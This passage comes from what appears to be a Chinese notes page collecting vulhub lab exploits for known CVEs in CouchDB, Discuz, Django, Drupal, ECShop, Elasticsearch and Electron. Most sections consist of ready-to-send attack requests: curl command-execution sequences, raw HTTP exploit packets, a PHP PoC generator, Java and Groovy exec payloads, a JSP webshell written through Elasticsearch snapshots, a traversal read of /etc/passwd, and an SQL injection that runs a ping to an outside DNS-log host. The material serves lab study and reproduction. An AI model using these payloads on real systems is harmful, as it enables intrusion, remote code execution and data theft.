<h3 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h3><p>影响版本：小于 1.7.0 以及 小于 2.1.1<br>利用：需要登陆才能触发，可以先用CVE-2017-12635创建一个账号<br>在1.6.0下，依次执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd'</span> -d <span class="string">'"id &gt;/tmp/success"'</span></span><br><span class="line">curl -X PUT <span class="string">'http://vulhub:vulhub@your-ip:5984/vultest'</span></span><br><span class="line">curl -X PUT <span class="string">'http://vulhub:vulhub@your-ip:5984/vultest/vul'</span> -d <span class="string">'&#123;"_id":"770895a97726d5ca6d70a22173005c7b"&#125;'</span></span><br><span class="line">curl -X POST <span class="string">'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10'</span> -d <span class="string">'&#123;"language":"cmd","map":""&#125;'</span> -H <span class="string">'Content-Type:application/json'</span></span><br></pre></td></tr></table></figure></p>
<p>vulhub:vulhub为管理员账号密码<br>在2.1.0下，先执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulhub:vulhub@your-ip:5984/_membership</span><br></pre></td></tr></table></figure></p>
<p>得到node的值nonode@nohost，然后，修改nonode@nohost的配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d <span class="string">'"id &gt;/tmp/success"'</span></span><br></pre></td></tr></table></figure></p>
<p>然后和1.6.0下的第二第三步相同，最后执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d <span class="string">'&#123;"_id":"_design/test","views":&#123;"wooyun":&#123;"map":""&#125; &#125;,"language":"cmd"&#125;'</span> -H <span class="string">"Content-Type: application/json"</span></span><br></pre></td></tr></table></figure></p>
<h2 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h2><p>一套通用的社区论坛软件系统</p>
<h3 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h3><p>直接发如下数据包，执行phpinfo<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1</span><br><span class="line">Host: ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p>
<h3 id="Discuz-X-≤3-4-任意文件删除漏洞"><a href="#Discuz-X-≤3-4-任意文件删除漏洞" class="headerlink" title="Discuz!X ≤3.4 任意文件删除漏洞"></a>Discuz!X ≤3.4 任意文件删除漏洞</h3><p>影响版本：Discuz!X ≤3.4<br>漏洞利用过程参见文档<br><a href="https://github.com/vulhub/vulhub/blob/master/discuz/x3.4-arbitrary-file-deletion/README.MD" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/discuz/x3.4-arbitrary-file-deletion/README.MD</a></p>
<h2 id="django"><a href="#django" class="headerlink" title="django"></a>django</h2><p>Django是一个开放源代码的Web应用框架，由Python写成。采用了MTV的框架模式</p>
<h3 id="Django-debug-page-XSS漏洞（CVE-2017-12794）"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）"></a>Django debug page XSS漏洞（CVE-2017-12794）</h3><p>影响版本 &lt;=1.11.4<br>利用过程:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册一个用户名为&lt;script&gt;alert(1)&lt;/script&gt;的用户 访问http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">再次注册一个用户名为&lt;script&gt;alert(1)&lt;/script&gt;的用户 再次访问</span><br></pre></td></tr></table></figure></p>
<h3 id="Django任意URL跳转漏洞（CVE-2018-14574）"><a href="#Django任意URL跳转漏洞（CVE-2018-14574）" class="headerlink" title="Django任意URL跳转漏洞（CVE-2018-14574）"></a>Django任意URL跳转漏洞（CVE-2018-14574）</h3><p>影响版本 &lt; 2.0.8<br>在path开头为//example.com的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞<br>访问<a href="http://your-ip:8000//www.example.com，即可返回是301跳转到//www.example.com/" target="_blank" rel="noopener">http://your-ip:8000//www.example.com，即可返回是301跳转到//www.example.com/</a></p>
<h3 id="Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"><a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）"></a>Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</h3><p>注入点/admin/vuln/collection/?detail__a’b=123<br><a href="https://xz.aliyun.com/t/5896#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/5896#toc-2</a><br>使用Postrgesql进行命令执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/admin/app01/json/?data__breed%27%3f%27a%27) OR 1%3d2 %3bCREATE table cmd_exec(cmd_output text) %2d%2d OR  (%22app01_json%22.%22data%22 -&gt; %27data</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8000/admin/app01/json/?data__breed%27%3f%27a%27) OR 1%3d2 %3bCOPY cmd_exec FROM PROGRAM %27ping christa.ccccc.ceye.io%27 %2d%2d OR  (%22app01_json%22.%22data%22 -&gt; %27data</span><br></pre></td></tr></table></figure></p>
<h3 id="Django-GIS-SQL注入漏洞（CVE-2020-9402）"><a href="#Django-GIS-SQL注入漏洞（CVE-2020-9402）" class="headerlink" title="Django GIS SQL注入漏洞（CVE-2020-9402）"></a>Django GIS SQL注入漏洞（CVE-2020-9402）</h3><p>该漏洞需要开发者使用了GIS中聚合查询的功能，用户在oracle的数据库且可控tolerance查询时的键名，在其位置注入SQL语句。<br>影响版本 &lt;3.0.4 &lt;2.2.11 &lt;1.11.29</p>
<h2 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h2><h3 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h3><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞。<br>dig @ip <a href="http://www.vulhub.org" target="_blank" rel="noopener">www.vulhub.org</a> 获取域名<a href="http://www.vulhub.org在目标dns服务器上的A记录" target="_blank" rel="noopener">www.vulhub.org在目标dns服务器上的A记录</a><br>也可以用nmap扫描<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script dns-zone-transfer.nse --script-args <span class="string">"dns-zone-transfer.domain=vulhub.org"</span> -Pn -p 53 ip</span><br></pre></td></tr></table></figure></p>
<h2 id="drupal"><a href="#drupal" class="headerlink" title="drupal"></a>drupal</h2><p>Drupal是使用PHP语言编写，用量庞大的一款CMS</p>
<h3 id="Drupal-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal  “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal  “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h3><p>影响版本 7.0~7.31<br>利用：直接发包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /?q=node&amp;destination=node HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+<span class="keyword">in</span>&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure></p>
<h3 id="Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）"><a href="#Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）" class="headerlink" title="Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）"></a>Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）</h3><p>影响版本 8.x &lt; 8.3.4<br>检测方法二 在Drupal根目录下找到文件/core/lib/Drupal/Component/Serialization/ YamlPecl.php，定位到函数public static function decode($raw)<br>如果该函数代码不包含” ini_set(‘yaml.decode_php’, 0);”调用，则存在该漏洞；否则，不存在该漏洞。<br>利用：</p>
<ol>
<li>登录一个管理员账号</li>
<li>访问 <a href="http://127.0.0.1:8080/admin/config/development/configuration/single/import" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/config/development/configuration/single/import</a></li>
<li><p>如下图所示，Configuration type 选择 Simple configuration，Configuration name 任意填写，Paste your configuration here 中填写PoC如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!php/object <span class="string">"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:&#123;s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:&#123;s:5:\"close\";s:7:\"phpinfo\";&#125;s:9:\"_fn_close\";s:7:\"phpinfo\";&#125;"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>点击 Import 后可以看到漏洞触发成功，弹出 phpinfo 页面。</p>
</li>
</ol>
<h3 id="Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）"></a>Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</h3><p>影响版本：6/7/8<br>利用：直接发包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[<span class="comment">#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</span></span><br></pre></td></tr></table></figure></p>
<h3 id="Drupal-远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal-远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2018-7602）"></a>Drupal 远程代码执行漏洞（CVE-2018-7602）</h3><p>绕过sanitize()函数过滤,参考<a href="https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py" target="_blank" rel="noopener">poc</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># "id"为要执行的命令 第一个drupal为用户名 第二个drupal为密码</span></span><br><span class="line">python3 drupa7-CVE-2018-7602.py -c <span class="string">"id"</span> drupal drupal http://127.0.0.1:8081/</span><br></pre></td></tr></table></figure></p>
<h3 id="Drupal-远程代码执行漏洞（CVE-2019-6339）-amp-Drupal-XSS漏洞（CVE-2019-6341）"><a href="#Drupal-远程代码执行漏洞（CVE-2019-6339）-amp-Drupal-XSS漏洞（CVE-2019-6341）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2019-6339）&amp; Drupal XSS漏洞（CVE-2019-6341）"></a>Drupal 远程代码执行漏洞（CVE-2019-6339）&amp; Drupal XSS漏洞（CVE-2019-6341）</h3><p>影响版本:<br>&lt;= Durpal 8.6.6<br>服务端开启评论配图或者攻击者拥有author以上权限的账号<br>被攻击者需要访问攻击者的url<br>详见<a href="https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6339" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6339</a><br><a href="https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6341" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6341</a></p>
<h2 id="ecshop"><a href="#ecshop" class="headerlink" title="ecshop"></a>ecshop</h2><h3 id="ECShop-2-x-3-x-SQL注入-任意代码执行漏洞"><a href="#ECShop-2-x-3-x-SQL注入-任意代码执行漏洞" class="headerlink" title="ECShop 2.x/3.x SQL注入/任意代码执行漏洞"></a>ECShop 2.x/3.x SQL注入/任意代码执行漏洞</h3><p>影响版本：3.6.0次新版以下<br>p神的脚本生成poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$shell</span> = bin2hex(<span class="string">"&#123;\$asd'];phpinfo\t();//&#125;xxx"</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="string">"-1' UNION/*"</span>;</span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">"num"</span> =&gt; sprintf(<span class="string">'*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -'</span>, bin2hex(<span class="variable">$id</span>), <span class="variable">$shell</span>),</span><br><span class="line">    <span class="string">"id"</span> =&gt; <span class="variable">$id</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hash3</span> = <span class="string">'45ea207d7a2b68c49582d2d22adf953a'</span>;</span><br><span class="line"><span class="variable">$hash2</span> = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"POC for ECShop 2.x: \n"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&#123;<span class="variable">$hash2</span>&#125;ads|&#123;<span class="variable">$s</span>&#125;&#123;<span class="variable">$hash2</span>&#125;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"\n\nPOC for ECShop 3.x: \n"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&#123;<span class="variable">$hash3</span>&#125;ads|&#123;<span class="variable">$s</span>&#125;&#123;<span class="variable">$hash3</span>&#125;"</span>;</span><br></pre></td></tr></table></figure></p>
<p>生成的poc放在referer里发送<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=login HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1</span><br><span class="line">Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:<span class="string">"num"</span>;s:107:<span class="string">"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -"</span>;s:2:<span class="string">"id"</span>;s:11:<span class="string">"-1' UNION/*"</span>;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></p>
<h2 id="elasticsearch"><a href="#elasticsearch" class="headerlink" title="elasticsearch"></a>elasticsearch</h2><p>Elasticsearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。</p>
<h3 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）</h3><p>jre版本：openjdk:8-jre</p>
<p>elasticsearch版本：v1.1.1<br>该漏洞需要es中至少存在一条数据，所以需要先创建一条数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: your-ip:9200</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"phithon"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后向/_search?pretty 发payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"size"</span>: 1,</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">      <span class="string">"filtered"</span>: &#123;</span><br><span class="line">        <span class="string">"query"</span>: &#123;</span><br><span class="line">          <span class="string">"match_all"</span>: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"script_fields"</span>: &#123;</span><br><span class="line">        <span class="string">"command"</span>: &#123;</span><br><span class="line">            <span class="string">"script"</span>: <span class="string">"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><a href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</h3><p>jre版本：openjdk:8-jre</p>
<p>elasticsearch版本：v1.4.2<br>基于CVE-2014-3120 payload变了<br>java反射绕过沙盒payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"size"</span>:1, <span class="string">"script_fields"</span>: &#123;<span class="string">"lupin"</span>:&#123;<span class="string">"lang"</span>:<span class="string">"groovy"</span>,<span class="string">"script"</span>: <span class="string">"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>Goovy直接执行命令法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def <span class="built_in">command</span>=<span class="string">'id'</span>;def res=command.execute().text;res</span><br></pre></td></tr></table></figure></p>
<h3 id="ElasticSearch-目录穿越漏洞（CVE-2015-3337）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-3337）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-3337）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-3337）</h3><p>jre版本：openjdk:8-jre</p>
<p>elasticsearch版本：v1.4.4</p>
<p>影响版本：1.4.5以下/1.5.2以下<br>安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。<br>直接 <a href="http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd读取任意文件（不要在浏览器访问）" target="_blank" rel="noopener">http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd读取任意文件（不要在浏览器访问）</a></p>
<h3 id="ElasticSearch-目录穿越漏洞（CVE-2015-5531）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-5531）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-5531）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</h3><p>jre版本：openjdk:8-jre</p>
<p>elasticsearch版本：v1.6.0</p>
<p>影响版本：1.6.1以下<br>elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。<br>利用：<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531</a></p>
<h3 id="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><a href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）" class="headerlink" title="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"></a>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h3><p>影响版本:  &lt;1.5.x<br>利用：</p>
<ol>
<li>创建一个恶意索引文档<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;":"test"&#125;</span></span><br><span class="line"><span class="string">'</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>2.创建一个恶意的存储库,location是写入的路径<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT <span class="string">'http://127.0.0.1:9200/_snapshot/yz.jsp'</span> -d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">     "type": "fs",</span></span><br><span class="line"><span class="string">     "settings": &#123;</span></span><br><span class="line"><span class="string">          "location": "/usr/local/tomcat/webapps/wwwroot/",</span></span><br><span class="line"><span class="string">          "compress": false</span></span><br><span class="line"><span class="string">     &#125;</span></span><br><span class="line"><span class="string">&#125;'</span></span><br></pre></td></tr></table></figure></p>
<ol start="3">
<li>存储库验证并创建:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT <span class="string">"http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp"</span> -d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">     "indices": "yz.jsp",</span></span><br><span class="line"><span class="string">     "ignore_unavailable": "true",</span></span><br><span class="line"><span class="string">     "include_global_state": false</span></span><br><span class="line"><span class="string">&#125;'</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>shell:<a href="http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp" target="_blank" rel="noopener">http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</a><br>该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串</p>
<h2 id="electron"><a href="#electron" class="headerlink" title="electron"></a>electron</h2><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。</p>
<h3 id="electron-远程命令执行漏洞（CVE-2018-1000006）"><a href="#electron-远程命令执行漏洞（CVE-2018-1000006）" class="headerlink" title="electron 远程命令执行漏洞（CVE-2018-1000006）"></a>electron 远程命令执行漏洞（CVE-2018-1000006）</h3><p>影响版本： &lt; v1.8.2-beta.4<br>条件：Windows下，Electron开发的应用注册了Protocol Handler（允许用户在浏览器中召起该应用）<br>利用见 <a href="https://github.com/vulhub/vulhub/blob/master/electron/CVE-2018-1000006/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/electron/CVE-2018-1000006/README.zh-cn.md</a></p>
<h3 id="Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）"><a href="#Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）" class="headerlink" title="Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）"></a>Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）</h3><p>用户可执行JavaScript的情况下（如访问第三方页面或APP存在XSS漏洞时），能够执行任意命令<br>poc(windows)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=<span class="string">"window.open().open('data:text/html,&lt;script&gt;require(\'child_process\').exec(\'calc.exe\')&lt;/script&gt;');"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="GhostScript"><a href="#GhostScript" class="headerlink" title="GhostScript"></a>GhostScript</h2><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p>
